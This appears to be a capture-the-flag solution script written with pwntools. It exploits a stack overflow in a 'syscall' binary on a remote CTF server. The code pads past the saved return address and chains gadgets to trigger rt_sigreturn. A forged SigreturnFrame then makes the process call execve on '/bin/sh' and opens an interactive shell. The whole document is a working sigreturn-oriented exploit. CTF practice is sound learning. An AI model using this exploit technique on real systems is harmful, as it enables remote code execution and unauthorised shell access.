from pwn import *

context.arch = 'amd64'

#sh = process("./public/syscall")
sh = remote("pwn.battlectf.online",1009)

func = 0x401136
binsh = 0x402004

moveax = func + 4
syscall = func + 10

frame = SigreturnFrame(kernel='amd64') 
frame.rax = constants.SYS_execve       
frame.rdi = binsh                      
frame.rip = syscall 

payload = b'A' * (0x30+8)                    
payload += p64(moveax)                 
payload += p64(syscall)                
payload += bytes(frame)                

sh.sendline(payload)

sh.interactive()
